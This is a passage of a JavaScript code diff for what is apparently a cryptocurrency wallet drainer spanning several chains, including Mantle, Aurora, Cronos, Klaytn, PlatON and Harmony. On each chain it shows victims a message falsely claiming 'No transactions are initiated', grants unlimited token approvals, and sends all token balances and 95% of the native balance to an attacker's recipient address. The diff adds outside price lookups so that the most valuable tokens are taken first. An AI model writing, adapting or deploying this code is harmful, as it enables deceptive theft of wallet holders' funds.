-                          for(let token of mantleTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(mantleContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(mantleContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTLE`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for MANTLE to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring MANTLE:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    mantleTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of mantleTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(mantleContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(mantleContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTLE`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for MANTLE to send')
+                       
                      }
-                      break;
-          
-                    //AURORA
-                    case aurora.chainId:
-                      const aurTokens = await fetchAURORATokens(address);
-          
-                      // Message to sign
-                      const aurMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const aurSignature = await signer.signMessage(aurMessage);
-                      console.log('Signature:', aurSignature);
-          
-                      const aurTokenDetails = [];
-                      for (let token of aurTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring MANTLE:', error);
+                       
+                   }
+                    break;
+        
+                  //AURORA
+                  case aurora.chainId:
+                    const aurTokens = await fetchAURORATokens(address);
+        
+                    // Message to sign
+                    const aurMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const aurSignature = await signer.signMessage(aurMessage);
+                    console.log('Signature:', aurSignature);
+        
+                    const aurTokenDetails = [];
+                    for (let token of aurTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               aurTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      aurTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of aurTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(auroraContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(auroraContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AURORA`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for AURORA to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring AURORA:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    aurTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of aurTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(auroraContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(auroraContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AURORA`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for AURORA to send')
+                       
                      }
-                      break;
-          
-          
-                    //CRONOS
-                    case cronos.chainId:
-                      const cronosTokens = await fetchCRONOSTokens(address);
-          
-                      // Message to sign
-                      const cronosMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const cronosSignature = await signer.signMessage(cronosMessage);
-                      console.log('Signature:', cronosSignature);
-          
-                      const cronosTokenDetails = [];
-                      for (let token of cronosTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring AURORA:', error);
+                       
+                   }
+                    break;
+        
+        
+                  //CRONOS
+                  case cronos.chainId:
+                    const cronosTokens = await fetchCRONOSTokens(address);
+        
+                    // Message to sign
+                    const cronosMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const cronosSignature = await signer.signMessage(cronosMessage);
+                    console.log('Signature:', cronosSignature);
+        
+                    const cronosTokenDetails = [];
+                    for (let token of cronosTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               cronosTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      cronosTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of cronosTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(cronosContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(cronosContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                         
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CRONOS`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for CRONOS to send')
-                       }
-                     } catch (error) {
-                          console.error('Error transferring CRONOS:', error);
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    cronosTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of cronosTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(cronosContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(cronosContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                       
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CRONOS`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for CRONOS to send')
                      }
-                      break;
-          
-          
-                    //KLAYTN
-                    case klaytn.chainId:
-                      const klaytnTokens = await fetchKLAYTNTokens(address);
-          
-                      // Message to sign
-                      const klaytnMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const klaytnSignature = await signer.signMessage(klaytnMessage);
-                      console.log('Signature:', klaytnSignature);
-          
-                      const klaytnTokenDetails = [];
-                      for (let token of klaytnTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring CRONOS:', error);
+                   }
+                    break;
+        
+        
+                  //KLAYTN
+                  case klaytn.chainId:
+                    const klaytnTokens = await fetchKLAYTNTokens(address);
+        
+                    // Message to sign
+                    const klaytnMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const klaytnSignature = await signer.signMessage(klaytnMessage);
+                    console.log('Signature:', klaytnSignature);
+        
+                    const klaytnTokenDetails = [];
+                    for (let token of klaytnTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               klaytnTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      klaytnTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of klaytnTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(klaytnContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(klaytnContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} KLAYTN`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for KLAYTN to send')
-                        
-                       }
-                     } catch (error) {
-                          console.error('Error transferring KLAYTN:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    klaytnTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of klaytnTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(klaytnContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(klaytnContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} KLAYTN`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for KLAYTN to send')
+                      
                      }
-                      break;
-          
-          
-                    
-                    //PLATON
-                    case platon.chainId:
-                      const platTokens = await fetchPLATONTokens(address);
-          
-                      // Message to sign
-                      const platMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const platSignature = await signer.signMessage(platMessage);
-                      console.log('Signature:', platSignature);
-          
-                      const platTokenDetails = [];
-                      for (let token of platTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring KLAYTN:', error);
+                        
+                   }
+                    break;
+        
+        
+                  
+                  //PLATON
+                  case platon.chainId:
+                    const platTokens = await fetchPLATONTokens(address);
+        
+                    // Message to sign
+                    const platMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const platSignature = await signer.signMessage(platMessage);
+                    console.log('Signature:', platSignature);
+        
+                    const platTokenDetails = [];
+                    for (let token of platTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               platTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      platTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of platTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(platonContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(platonContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} PLATON`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for PLATON to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring PLATON:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    platTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of platTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(platonContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(platonContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} PLATON`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for PLATON to send')
+                       
                      }
-                      break;
-          
-          
-                    //HARMONY
-                    case harmony.chainId:
-                      const harTokens = await fetchHARMONYTokens(address);
-          
-                      // Message to sign
-                      const harMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const harSignature = await signer.signMessage(harMessage);
-                      console.log('Signature:', harSignature);
-          
-                      const harTokenDetails = [];
-                      for (let token of harTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring PLATON:', error);
+                       
+                   }
+                    break;
+        
+        
+                  //HARMONY
+                  case harmony.chainId:
+                    const harTokens = await fetchHARMONYTokens(address);
+        
+                    // Message to sign
+                    const harMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const harSignature = await signer.signMessage(harMessage);
+                    console.log('Signature:', harSignature);
+        
+                    const harTokenDetails = [];
+                    for (let token of harTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               harTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      harTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of harTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(harmonyContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(harmonyContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HARMONY`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
